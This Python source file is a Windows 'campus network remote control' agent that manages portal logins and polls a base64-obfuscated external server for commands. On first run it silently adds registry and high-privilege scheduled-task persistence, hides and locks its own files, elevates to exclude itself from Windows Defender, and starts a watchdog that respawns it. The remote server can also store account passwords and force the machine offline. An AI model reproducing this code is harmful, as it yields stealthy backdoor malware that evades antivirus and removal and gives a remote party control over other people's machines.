#!/usr/bin/env python3
"""
校园网远程控制 - Agent (本地客户端)
功能: 自动上报状态、接收远程命令(下线/登录/刷新)
安装后自动运行，保持与控制面板的连接
"""
import json, time, os, sys, socket, uuid, hashlib, platform, traceback, base64
import urllib.request, urllib.parse, urllib.error

# ============ 配置 ============
# 服务器地址 (base64 混淆, 不以明文出现在二进制中)
_S = b'aHR0cHM6Ly95dWFuYWkuYmVzdC9neWs='  # https://yuanai.best/gyk
DEFAULT_SERVER = base64.b64decode(_S).decode()
PORTAL_IP = "10.228.9.7"
# API 鉴权密钥 (服务器和客户端必须一致)
API_SECRET = "CampusNet@2026#Secure"
HEARTBEAT_INTERVAL = 5  # 心跳间隔(秒)

# PyInstaller 打包后 __file__ 指向临时目录, 需用 exe 实际路径
if getattr(sys, 'frozen', False):
    # 打包后: sys.executable = exe 实际路径
    AGENT_EXE = sys.executable
    AGENT_DIR = os.path.dirname(AGENT_EXE)
else:
    # 开发环境: 直接用脚本路径
    AGENT_EXE = os.path.abspath(__file__)
    AGENT_DIR = os.path.dirname(AGENT_EXE)

CONFIG_FILE = os.path.join(AGENT_DIR, "agent_config.json")
AGENT_SCRIPT = AGENT_EXE
REG_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
REG_NAME = "CampusNetAgent"

# ============ 工具函数 ============

def get_mac():
    """获取本机 MAC 地址"""
    mac_int = uuid.getnode()
    mac_str = ":".join(f"{(mac_int >> (8 * i)) & 0xFF:02X}" for i in reversed(range(6)))
    return mac_str

def get_local_ip():
    """获取本机局域网 IP"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def get_agent_id():
    """生成唯一 Agent ID (基于主机名+MAC)"""
    hostname = socket.gethostname()
    mac = get_mac()
    return hashlib.md5(f"{hostname}-{mac}".encode()).hexdigest()[:12]

def _sign(data_str):
    """生成 API 签名"""
    ts = str(int(time.time()))
    sig = hashlib.sha256(f"{API_SECRET}:{ts}:{data_str[:64]}".encode()).hexdigest()[:16]
    return ts, sig

def http_post(url, data, timeout=8):
    """发送 POST 请求 (带 API 签名鉴权)"""
    body = json.dumps(data).encode("utf-8")
    ts, sig = _sign(body.decode())
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("X-Auth-Ts", ts)
    req.add_header("X-Auth-Sig", sig)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return json.loads(resp.read().decode("utf-8"))
    except Exception as e:
        return {"error": str(e)}

def http_get(url, timeout=8):
    """发送 GET 请求"""
    try:
        with urllib.request.urlopen(url, timeout=timeout) as resp:
            return resp.read().decode("utf-8")
    except:
        return None

# ============ 开机自启管理 (Windows) ============
TASK_NAME = "CampusNetAgent"

def _is_admin():
    """检查是否有管理员权限"""
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def _run_as_admin(cmd_args):
    """以管理员权限运行命令, 返回 (成功, 输出)"""
    import subprocess
    
    def _quote(s):
        """给带空格的参数加引号"""
        return f'"{s}"' if " " in s and not s.startswith('"') else s
    
    try:
        # 先尝试直接运行 (已有管理员权限)
        print(f"  [ADMIN] 尝试直接运行: {cmd_args[0]} ...")
        r = subprocess.run(cmd_args, capture_output=True, text=True, timeout=15,
                          creationflags=subprocess.CREATE_NO_WINDOW)
        if r.returncode == 0:
            print(f"  [ADMIN] 直接运行成功")
            return True, r.stdout.strip()
        print(f"  [ADMIN] 直接运行失败 (code={r.returncode}): {r.stderr.strip()[:80]}")
        
        # 需要 UAC 提权
        import ctypes
        bat_path = os.path.join(AGENT_DIR, "_admin_cmd.bat")
        result_path = os.path.join(AGENT_DIR, "_admin_result.txt")
        # 删除旧的结果文件
        if os.path.exists(result_path):
            os.remove(result_path)
        # 写 bat，参数正确引号
        cmd_line = " ".join(_quote(a) for a in cmd_args)
        with open(bat_path, "w", encoding="gbk") as f:
            f.write("@echo off\n")
            f.write(f'chcp 65001 >nul 2>&1\n')
            f.write(f'{cmd_line} > "{result_path}" 2>&1\n')
        print(f"  [ADMIN] 请求 UAC 提权...")
        # 请求 UAC
        ret = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", "cmd.exe", f'/c "{bat_path}"', None, 1)  # 1=SW_SHOWNORMAL
        if ret <= 32:
            return False, f"UAC 被拒绝 (code={ret})"
        # 等待执行完
        import time as _t
        for _ in range(60):  # 等最多30秒
            _t.sleep(0.5)
            if os.path.exists(result_path):
                _t.sleep(0.3)  # 等写完
                with open(result_path, "r", encoding="utf-8", errors="replace") as rf:
                    output = rf.read().strip()
                try: os.remove(result_path)
                except: pass
                try: os.remove(bat_path)
                except: pass
                print(f"  [ADMIN] UAC 执行完毕: {output[:80]}")
                return True, output
        try: os.remove(bat_path)
        except: pass
        return True, "已执行(等待超时)"
    except Exception as e:
        print(f"  [ADMIN] 异常: {e}")
        return False, str(e)

def _task_exists():
    """检查计划任务是否存在"""
    import subprocess
    try:
        r = subprocess.run(
            ["schtasks", "/Query", "/TN", TASK_NAME],
            capture_output=True, text=True, timeout=10,
            creationflags=subprocess.CREATE_NO_WINDOW)
        return r.returncode == 0
    except:
        return False

def _reg_exists():
    """检查注册表自启是否存在"""
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_KEY, 0, winreg.KEY_READ)
        try:
            val, _ = winreg.QueryValueEx(key, REG_NAME)
            winreg.CloseKey(key)
            return bool(val)
        except FileNotFoundError:
            winreg.CloseKey(key)
            return False
    except:
        return False

def is_autostart_enabled():
    """检查是否已设置开机自启 (注册表 或 计划任务)"""
    if platform.system() != "Windows":
        return False
    return _reg_exists() or _task_exists()

def _create_vbs():
    """创建 VBS 静默启动脚本"""
    vbs_path = os.path.join(AGENT_DIR, "start_agent.vbs")
    if getattr(sys, 'frozen', False):
        # 打包后: 直接启动 exe
        with open(vbs_path, "w", encoding="utf-8") as f:
            f.write(f'Set ws = CreateObject("WScript.Shell")\n')
            f.write(f'ws.Run """{AGENT_EXE}""", 0, False\n')
    else:
        # 开发环境: 用 python 启动脚本
        python_exe = sys.executable
        with open(vbs_path, "w", encoding="utf-8") as f:
            f.write(f'Set ws = CreateObject("WScript.Shell")\n')
            f.write(f'ws.Run """{python_exe}"" ""{AGENT_SCRIPT}""", 0, False\n')
    return vbs_path

def enable_autostart():
    """启用开机自启 (注册表 + 计划任务双保险)"""
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    results = []
    vbs_path = _create_vbs()

    # 方式1: 注册表 (HKCU, 不需要管理员)
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_KEY, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, REG_NAME, 0, winreg.REG_SZ, f'wscript.exe "{vbs_path}"')
        winreg.CloseKey(key)
        results.append("注册表✓")
    except Exception as e:
        results.append(f"注册表✗({e})")

    # 方式2: 计划任务 (需要管理员, 安全软件难拦截)
    python_exe = sys.executable
    # schtasks 创建开机登录时运行的任务
    cmd = [
        "schtasks", "/Create", "/F",
        "/TN", TASK_NAME,
        "/TR", f'wscript.exe "{vbs_path}"',
        "/SC", "ONLOGON",
        "/RL", "HIGHEST",
        "/DELAY", "0000:10",  # 登录后延迟10秒启动
    ]
    ok, out = _run_as_admin(cmd)
    if ok and ("成功" in out or "SUCCESS" in out.upper() or "已执行" in out):
        results.append("计划任务✓")
    else:
        results.append(f"计划任务✗({out[:50]})")

    success = any("✓" in r for r in results)
    return success, "已启用: " + " | ".join(results)

def disable_autostart():
    """禁用开机自启 (清除注册表 + 计划任务)"""
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    results = []

    # 清注册表
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_KEY, 0, winreg.KEY_SET_VALUE)
        try:
            winreg.DeleteValue(key, REG_NAME)
        except FileNotFoundError:
            pass
        winreg.CloseKey(key)
        results.append("注册表✓")
    except Exception as e:
        results.append(f"注册表✗({e})")

    # 删计划任务
    cmd = ["schtasks", "/Delete", "/TN", TASK_NAME, "/F"]
    ok, out = _run_as_admin(cmd)
    if ok:
        results.append("计划任务✓")
    else:
        results.append(f"计划任务✗({out[:50]})")

    # 清理 VBS
    vbs_path = os.path.join(AGENT_DIR, "start_agent.vbs")
    if os.path.exists(vbs_path):
        os.remove(vbs_path)

    success = any("✓" in r for r in results)
    return success, "已禁用: " + " | ".join(results)

# ============ 文件/进程保护 (Windows) ============

def protect_files():
    """保护 Agent 文件: 隐藏+系统+只读属性 + NTFS权限"""
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    import subprocess
    results = []
    agent_dir = os.path.dirname(AGENT_SCRIPT)
    
    # 1. 设置文件属性: 隐藏+系统+只读
    targets = [AGENT_SCRIPT, CONFIG_FILE,
               os.path.join(agent_dir, "start_agent.vbs")]
    for f in targets:
        if os.path.exists(f):
            try:
                subprocess.run(["attrib", "+H", "+S", "+R", f],
                             capture_output=True, timeout=5,
                             creationflags=subprocess.CREATE_NO_WINDOW)
            except: pass
    results.append("属性(隐藏+系统+只读)✓")
    
    # 2. NTFS 权限: 仅管理员和SYSTEM可修改
    cmd = ["icacls", agent_dir, "/inheritance:r",
           "/grant:r", "SYSTEM:(OI)(CI)F",
           "/grant:r", "Administrators:(OI)(CI)F",
           "/grant:r", f"{os.environ.get('USERNAME','*')}:(OI)(CI)RX"]
    ok, out = _run_as_admin(cmd)
    if ok:
        results.append("NTFS权限✓")
    else:
        results.append(f"NTFS权限✗({out[:40]})")
    
    return True, " | ".join(results)

def unprotect_files():
    """移除文件保护"""
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    import subprocess
    agent_dir = os.path.dirname(AGENT_SCRIPT)
    
    # 移除属性
    targets = [AGENT_SCRIPT, CONFIG_FILE,
               os.path.join(agent_dir, "start_agent.vbs")]
    for f in targets:
        if os.path.exists(f):
            try:
                subprocess.run(["attrib", "-H", "-S", "-R", f],
                             capture_output=True, timeout=5,
                             creationflags=subprocess.CREATE_NO_WINDOW)
            except: pass
    
    # 恢复 NTFS 继承
    cmd = ["icacls", agent_dir, "/inheritance:e", "/reset"]
    _run_as_admin(cmd)
    return True, "文件保护已移除"

def add_defender_exclusion():
    """添加 Windows Defender 白名单"""
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    agent_dir = os.path.dirname(AGENT_SCRIPT)
    cmd = ["powershell", "-Command",
           f'Add-MpPreference -ExclusionPath "{agent_dir}"']
    ok, out = _run_as_admin(cmd)
    if ok:
        return True, f"Defender 白名单已添加: {agent_dir}"
    return False, f"添加失败: {out[:60]}"

def remove_defender_exclusion():
    """移除 Windows Defender 白名单"""
    if platform.system() != "Windows":
        return False, "仅支持 Windows"
    agent_dir = os.path.dirname(AGENT_SCRIPT)
    cmd = ["powershell", "-Command",
           f'Remove-MpPreference -ExclusionPath "{agent_dir}"']
    ok, out = _run_as_admin(cmd)
    return True, "Defender 白名单已移除"

def _start_watchdog():
    """启动看门狗: 创建一个监控脚本, 主进程被杀后自动重启"""
    if platform.system() != "Windows":
        return
    import subprocess
    watchdog_vbs = os.path.join(AGENT_DIR, "_watchdog.vbs")
    pid = os.getpid()
    if getattr(sys, 'frozen', False):
        # 打包后: 监控 exe 进程名
        exe_name = os.path.basename(AGENT_EXE)
        vbs_code = f'''Set ws = CreateObject("WScript.Shell")
WScript.Sleep 10000
Do While True
    On Error Resume Next
    Set objWMI = GetObject("winmgmts:")
    Set procs = objWMI.ExecQuery("SELECT * FROM Win32_Process WHERE Name = '{exe_name}'")
    If procs.Count = 0 Then
        ws.Run """{AGENT_EXE}""", 0, False
    End If
    On Error Goto 0
    WScript.Sleep 30000
Loop
'''
    else:
        # 开发环境: 监控 python 进程
        python_exe = sys.executable
        vbs_code = f'''Set ws = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
agentScript = "{AGENT_SCRIPT}"
pythonExe = "{python_exe}"
WScript.Sleep 10000
Do While True
    On Error Resume Next
    Set objWMI = GetObject("winmgmts:")
    Set procs = objWMI.ExecQuery("SELECT * FROM Win32_Process WHERE CommandLine LIKE '%" & Replace(agentScript, "\\", "\\\\") & "%' AND Name = 'python.exe'")
    If procs.Count = 0 Then
        ws.Run """" & pythonExe & """ """ & agentScript & """", 0, False
    End If
    On Error Goto 0
    WScript.Sleep 30000
Loop
'''
    with open(watchdog_vbs, "w", encoding="utf-8") as f:
        f.write(vbs_code)
    # 静默启动看门狗
    subprocess.Popen(["wscript.exe", watchdog_vbs],
                    creationflags=subprocess.CREATE_NO_WINDOW)
    print("  [GUARD] 看门狗已启动")

# ============ 配置管理 ============

def load_config():
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {}

def save_config(cfg):
    try:
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
            json.dump(cfg, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"[WARN] 保存配置失败: {e}")

# ============ 校园网操作 ============

class CampusNet:
    def __init__(self, portal_ip=PORTAL_IP):
        self.portal_ip = portal_ip
        self.base_url = f"http://{portal_ip}"
        self.user_index = ""
        self.username = ""
        self.password = ""

    def check_online(self):
        """检测是否在线, 返回 (online, campus_ip, user_index, message)"""
        import re
        try:
            # 1. 多种方式提取 userIndex
            if not self.user_index:
                for url in [
                    f"{self.base_url}/eportal/redirectortos498.portal",
                    f"{self.base_url}/eportal/",
                    f"{self.base_url}/eportal/success.jsp",
                ]:
                    try:
                        resp_text = http_get(url, timeout=5) or ""
                        # 在页面内容、JS跳转、URL参数中搜索 userIndex
                        m = re.search(r'userIndex[=:]\s*["\']?([a-fA-F0-9]{16,})', resp_text)
                        if m:
                            self.user_index = m.group(1)
                            print(f"  [NET] 从 {url} 提取到 userIndex")
                            break
                    except:
                        pass

            # 2. 用 userIndex 获取完整用户信息
            if self.user_index:
                try:
                    info_url = f"{self.base_url}/eportal/InterFace.do?method=getOnlineUserInfo"
                    data = urllib.parse.urlencode({"userIndex": self.user_index}).encode()
                    req = urllib.request.Request(info_url, data=data, method="POST")
                    req.add_header("Content-Type", "application/x-www-form-urlencoded")
                    with urllib.request.urlopen(req, timeout=5) as resp:
                        text = resp.read().decode("utf-8")
                        info = json.loads(text)
                        ui = info.get("userIndex", "")
                        name = info.get("userName", "")
                        uid = info.get("userId", "")
                        if ui or info.get("result") == "success":
                            if ui:
                                self.user_index = ui
                            if name and not self.username:
                                self.username = name
                            if uid and not self.username:
                                self.username = uid
                            return True, get_local_ip(), self.user_index, f"已认证: {name or uid}"
                        else:
                            print(f"  [NET] getOnlineUserInfo 失败: {info.get('message','')}")
                            self.user_index = ""
                except Exception as e:
                    print(f"  [NET] getOnlineUserInfo 异常: {e}")

            # 3. 直接调 getOnlineUserInfo (空 userIndex, Portal 按 IP 返回)
            try:
                info_url = f"{self.base_url}/eportal/InterFace.do?method=getOnlineUserInfo"
                req = urllib.request.Request(info_url, data=b"userIndex=", method="POST")
                req.add_header("Content-Type", "application/x-www-form-urlencoded")
                with urllib.request.urlopen(req, timeout=5) as resp:
                    text = resp.read().decode("utf-8")
                    info = json.loads(text)
                    # Portal 可能返回 result=success 或 result=wait, 只要有 userIndex 就算在线
                    ui = info.get("userIndex", "")
                    name = info.get("userName", "")
                    uid = info.get("userId", "")
                    if ui:
                        self.user_index = ui
                        if name and not self.username:
                            self.username = name
                        if uid and not self.username:
                            self.username = uid
                        return True, get_local_ip(), self.user_index, f"已认证: {name or uid}"
            except:
                pass

            # 4. 检测网络连通性
            try:
                urllib.request.urlopen("http://www.baidu.com", timeout=3)
                return True, get_local_ip(), self.user_index, "网络可用(未获取token)"
            except:
                return False, get_local_ip(), "", "网络不可用"

        except Exception as e:
            return False, get_local_ip(), "", str(e)

    def login(self, username, password, service=""):
        """登录校园网"""
        try:
            self.username = username
            self.password = password
            url = f"{self.base_url}/eportal/InterFace.do?method=login"
            data = urllib.parse.urlencode({
                "userId": username,
                "password": password,
                "service": service,
                "queryString": "",
                "operatorPwd": "",
                "operatorUserId": "",
                "validcode": "",
                "passwordEncrypt": "false",
            }).encode()
            req = urllib.request.Request(url, data=data, method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            with urllib.request.urlopen(req, timeout=10) as resp:
                text = resp.read().decode("utf-8")
                result = json.loads(text)
                if result.get("result") == "success":
                    self.user_index = result.get("userIndex", "")
                return result
        except Exception as e:
            return {"result": "fail", "message": str(e)}

    def cancel_mab(self):
        """取消本机无感认证 (cancelMab)"""
        if not self.user_index:
            return {"result": "fail", "message": "无 userIndex"}
        try:
            url = f"{self.base_url}/eportal/InterFace.do?method=cancelMab"
            data = urllib.parse.urlencode({"userIndex": self.user_index}).encode()
            req = urllib.request.Request(url, data=data, method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            with urllib.request.urlopen(req, timeout=10) as resp:
                text = resp.read().decode("utf-8")
                print(f"  [NET] cancelMab: {text[:120]}")
                return json.loads(text)
        except Exception as e:
            return {"result": "fail", "message": str(e)}

    def cancel_mac_by_name(self):
        """用账号+MAC取消无感认证绑定 (cancelMacWithUserNameAndMac)"""
        if not self.username:
            return {"result": "fail", "message": "无用户名"}
        try:
            mac = get_mac().replace(":", "")
            url = f"{self.base_url}/eportal/InterFace.do?method=cancelMacWithUserNameAndMac"
            data = urllib.parse.urlencode({"userId": self.username, "usermac": mac}).encode()
            req = urllib.request.Request(url, data=data, method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            with urllib.request.urlopen(req, timeout=10) as resp:
                text = resp.read().decode("utf-8")
                print(f"  [NET] cancelMacByName: {text[:120]}")
                return json.loads(text)
        except Exception as e:
            return {"result": "fail", "message": str(e)}

    def logout(self):
        """注销"""
        if not self.user_index:
            return {"result": "fail", "message": "无 userIndex"}
        try:
            url = f"{self.base_url}/eportal/InterFace.do?method=logout"
            data = urllib.parse.urlencode({"userIndex": self.user_index}).encode()
            req = urllib.request.Request(url, data=data, method="POST")
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
            with urllib.request.urlopen(req, timeout=10) as resp:
                text = resp.read().decode("utf-8")
                result = json.loads(text)
                if result.get("result") == "success":
                    self.user_index = ""
                return result
        except Exception as e:
            return {"result": "fail", "message": str(e)}

    def full_logout(self):
        """完整下线: 取消无感认证 + 注销"""
        results = []
        # 1. 取消无感认证 (两种方式都试)
        r1 = self.cancel_mab()
        results.append(f"cancelMab: {r1.get('result','')}")
        r2 = self.cancel_mac_by_name()
        results.append(f"cancelMac: {r2.get('result','')}")
        # 2. 注销
        r3 = self.logout()
        results.append(f"logout: {r3.get('result','')}")
        ok = r3.get("result") == "success"
        return {"result": "success" if ok else "fail", "message": " | ".join(results)}

# ============ Agent 主类 ============

class Agent:
    def __init__(self, server_url=None):
        self.cfg = load_config()
        self.server_url = (server_url or self.cfg.get("server") or DEFAULT_SERVER).rstrip("/")
        self.agent_id = get_agent_id()
        self.hostname = socket.gethostname()
        self.mac = get_mac()
        self.start_time = time.time()
        self.net = CampusNet(self.cfg.get("portal_ip", PORTAL_IP))
        
        # 恢复保存的凭据
        self.net.username = self.cfg.get("username", "")
        self.net.password = self.cfg.get("password", "")
        self.net.user_index = self.cfg.get("user_index", "")
        
        self.was_online = False     # 上一次检测是否在线
        self.force_offline = False  # 强制离线锁: True时持续执行下线
        self.force_offline_until = 0   # 强制离线到期时间戳 (0=永久直到手动解锁)

    def get_uptime(self):
        s = int(time.time() - self.start_time)
        if s < 60: return f"{s}秒"
        if s < 3600: return f"{s//60}分{s%60}秒"
        return f"{s//3600}时{(s%3600)//60}分"

    def _enforce_offline(self, online):
        """强制离线: 检测到又被无感认证自动连上时, 立刻再次下线"""
        if not self.force_offline:
            return
        # 检查定时解锁
        if self.force_offline_until > 0 and time.time() >= self.force_offline_until:
            self.force_offline = False
            self.force_offline_until = 0
            print("  [强制离线] 定时到期，自动解锁")
            return
        if not online:
            return
        print("  [强制离线] 检测到被自动重连, 执行下线...")
        self.net.cancel_mab()
        self.net.cancel_mac_by_name()
        self.net.logout()
        print("  [强制离线] 已重新下线")

    def build_status(self):
        """构建上报状态"""
        online, campus_ip, ui, msg = self.net.check_online()
        if ui:
            self.net.user_index = ui
        
        # 强制离线巡逻
        self._enforce_offline(online)
        if self.force_offline and online:
            online = False
            if self.force_offline_until > 0:
                left = int(self.force_offline_until - time.time())
                msg = f"强制离线中({left}秒后解锁)"
            else:
                msg = "强制离线中(永久)"
        
        # 断连单次触发: 从在线→离线时, 自动执行一次full_logout清理无感认证
        if self.was_online and not online and not self.force_offline:
            print("  [断连] 检测到网络断开, 单次清理无感认证...")
            self.net.cancel_mab()
            self.net.cancel_mac_by_name()
            try:
                self.net.logout()
            except: pass
            print("  [断连] 清理完毕")
        self.was_online = online
        
        return {
            "agent_id": self.agent_id,
            "hostname": self.hostname,
            "platform": platform.system(),
            "local_ip": get_local_ip(),
            "campus_ip": campus_ip,
            "mac": self.mac,
            "username": self.net.username,
            "user_index": self.net.user_index,
            "net_online": online,
            "net_message": msg,
            "uptime": self.get_uptime(),
            "autostart": is_autostart_enabled(),
            "autostart_reg": _reg_exists(),
            "autostart_task": _task_exists(),
            "force_offline": self.force_offline,
            "force_offline_until": self.force_offline_until,
            "version": "1.1",
        }

    def heartbeat(self):
        """发送心跳并接收命令"""
        status = self.build_status()
        result = http_post(f"{self.server_url}/api/heartbeat", status)
        if "error" in result:
            print(f"  [!] 心跳失败: {result['error']}")
            return
        # 处理命令
        for cmd in result.get("commands", []):
            self.execute(cmd)

    def execute(self, cmd):
        """执行远程命令"""
        command = cmd.get("command", "")
        params = cmd.get("params", {})
        cmd_id = cmd.get("id", "")
        print(f"  [CMD] 执行: {command} (id={cmd_id})")
        
        success = False
        message = ""
        
        try:
            if command == "logout":
                r = self.net.full_logout()
                success = r.get("result") == "success"
                message = r.get("message", "已下线" if success else "下线失败")
                # 启用强制离线锁, 防止无感认证自动重连
                self.force_offline = True
                self.reconnect_at = 0
                duration = int(params.get("duration", 0))  # 0=永久
                if duration > 0:
                    self.force_offline_until = time.time() + duration
                    message += f" | 强制离线 {duration}秒"
                else:
                    self.force_offline_until = 0
                    message += " | 强制离线(永久,发送unlock解锁)"

            elif command == "cancel_mab":
                r1 = self.net.cancel_mab()
                r2 = self.net.cancel_mac_by_name()
                success = r1.get("result")=="success" or r2.get("result")=="success"
                message = f"cancelMab:{r1.get('result','')} cancelMac:{r2.get('result','')}"

            elif command == "unlock":
                self.force_offline = False
                self.force_offline_until = 0
                success = True
                message = "强制离线锁已解除"

            elif command == "login_now":
                # 立即登录 (本地执行，不需要网络到服务器)
                if self.net.username and self.net.password:
                    r = self.net.login(self.net.username, self.net.password)
                    success = r.get("result") == "success"
                    message = r.get("message", "已登录" if success else "登录失败")
                else:
                    message = "无保存的账号密码"
                
            elif command == "login":
                self.force_offline = False  # 登录指令自动解除强制离线
                username = params.get("username", self.net.username)
                password = params.get("password", self.net.password)
                if not username or not password:
                    message = "无账号密码，无法登录"
                else:
                    r = self.net.login(username, password, params.get("service", ""))
                    success = r.get("result") == "success"
                    message = r.get("message", "已登录" if success else "登录失败")
                    if success:
                        self.net.username = username
                        self.net.password = password
                        self._save_credentials()
                        
            elif command == "refresh":
                online, ip, ui, msg = self.net.check_online()
                success = True
                message = f"{'在线' if online else '离线'} - {ip} - {msg}"
                
            elif command == "set_credentials":
                self.net.username = params.get("username", "")
                self.net.password = params.get("password", "")
                self._save_credentials()
                success = True
                message = f"已设置凭据: {self.net.username}"

            elif command == "enable_autostart":
                success, message = enable_autostart()

            elif command == "disable_autostart":
                success, message = disable_autostart()

            elif command == "protect":
                r1 = protect_files()
                r2 = add_defender_exclusion()
                success = r1[0] or r2[0]
                message = f"文件保护: {r1[1]} | Defender: {r2[1]}"

            elif command == "unprotect":
                r1 = unprotect_files()
                r2 = remove_defender_exclusion()
                success = True
                message = f"{r1[1]} | {r2[1]}"

            elif command == "start_watchdog":
                _start_watchdog()
                success = True
                message = "看门狗已启动(30秒检测一次)"
                
            else:
                message = f"未知命令: {command}"
                
        except Exception as e:
            message = f"执行异常: {e}"
            traceback.print_exc()
        
        # 回报结果
        print(f"  [RES] {command}: {'✓' if success else '✗'} {message}")
        http_post(f"{self.server_url}/api/report", {
            "agent_id": self.agent_id,
            "cmd_id": cmd_id,
            "success": success,
            "message": message,
        })

    def _save_credentials(self):
        self.cfg["username"] = self.net.username
        self.cfg["password"] = self.net.password
        self.cfg["user_index"] = self.net.user_index
        self.cfg["server"] = self.server_url
        save_config(self.cfg)

    def run(self):
        """主循环"""
        print("=" * 50)
        print("  校园网远程控制 - Agent")
        print("=" * 50)
        print(f"  Agent ID : {self.agent_id}")
        print(f"  主机名   : {self.hostname}")
        print(f"  MAC      : {self.mac}")
        print(f"  本机 IP  : {get_local_ip()}")
        print(f"  服务器   : {self.server_url}")
        print(f"  用户名   : {self.net.username or '(未设置)'}")
        print("=" * 50)
        print("  Agent 运行中... (Ctrl+C 停止)\n")
        
        # 自动启动看门狗
        if not getattr(self, '_no_watchdog', False):
            try:
                _start_watchdog()
            except Exception as e:
                print(f"  [GUARD] 看门狗启动失败: {e}")
        
        while True:
            try:
                self.heartbeat()
            except KeyboardInterrupt:
                print("\n  Agent 已停止")
                break
            except Exception as e:
                print(f"  [ERR] {e}")
            time.sleep(HEARTBEAT_INTERVAL)


# ============ 入口 ============

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="校园网远程控制 Agent")
    parser.add_argument("--server", default=None, help="控制面板地址")
    parser.add_argument("--portal", default=None, help="Portal IP")
    parser.add_argument("--no-autostart", action="store_true", help="跳过自动设置开机自启")
    parser.add_argument("--no-protect", action="store_true", help="跳过文件防护")
    parser.add_argument("--no-watchdog", action="store_true", help="禁用看门狗")
    args = parser.parse_args()

    # 首次运行: 静默自动配置 (开机自启 + 文件防护 + Defender白名单)
    cfg = load_config()
    if not cfg.get("_installed"):
        print("  [安装] 首次运行，自动配置...")
        if not args.no_autostart:
            ok, msg = enable_autostart()
            print(f"  {'✓' if ok else '✗'} 自启: {msg}")
        if not args.no_protect:
            ok, msg = protect_files()
            print(f"  {'✓' if ok else '✗'} 防护: {msg}")
            ok, msg = add_defender_exclusion()
            print(f"  {'✓' if ok else '✗'} 白名单: {msg}")
        cfg["_installed"] = True
        cfg["server"] = DEFAULT_SERVER
        save_config(cfg)

    agent = Agent(server_url=args.server)
    agent._no_watchdog = args.no_watchdog
    
    if args.portal:
        agent.net.portal_ip = args.portal
        agent.net.base_url = f"http://{args.portal}"
    
    agent.run()
